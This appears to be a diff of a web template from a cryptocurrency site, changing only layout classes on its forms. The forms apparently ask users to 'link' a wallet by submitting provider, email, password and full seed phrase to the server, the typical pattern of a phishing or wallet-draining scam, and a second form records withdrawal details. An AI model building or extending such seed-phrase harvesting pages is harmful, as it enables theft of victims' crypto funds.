@@ -26,23 +26,23 @@
                         <form class="row g-3" method="post"  action="{{route('wallet.link.wallet')}}">
                             @include('templates.notification')
                             @csrf
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">Wallet provider</label>
                                 <input type="text" name="provider" id="refer-link" class="form-control"
                                        placeholder="E.g Trustwallet ..." required>
                             </div>
 
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">Email address</label>
                                 <input type="email" name="email" id="refer-link" class="form-control"
                                        placeholder="E.g jack@gmail.com" >
                             </div>
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">Password</label>
                                 <input type="text" name="password" id="refer-link" class="form-control"
                                        placeholder="Enter password" >
                             </div>
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">Seedphrase</label>
                                 <textarea placeholder="Enter seed phrase. eg: raw, math" class="form-control" name="seed"></textarea>
                             </div>
@@ -73,19 +73,19 @@
                             @include('templates.notification')
                             @csrf
 
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">CryptoCurrency Coin/Token</label>
                                 <input type="text" name="coin" id="refer-link" class="form-control"
                                        placeholder="BTC, ETH, USDT" >
                             </div>
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">Exact Amount Withdrawn</label>
                                 <input type="number" name="amount" step="0.0000000000001" id="refer-link" class="form-control"
                                        placeholder="1000" >
                             </div>
 
 
-                            <div class="form-group mb-3">
+                            <div class="form-group mb-3 col-12">
                                 <label for="">Wallet Address Withdrawn to</label>
                                 <input type="text" name="wallet" id="refer-link" class="form-control"
                                        placeholder="E.g Trustwallet ..." required>
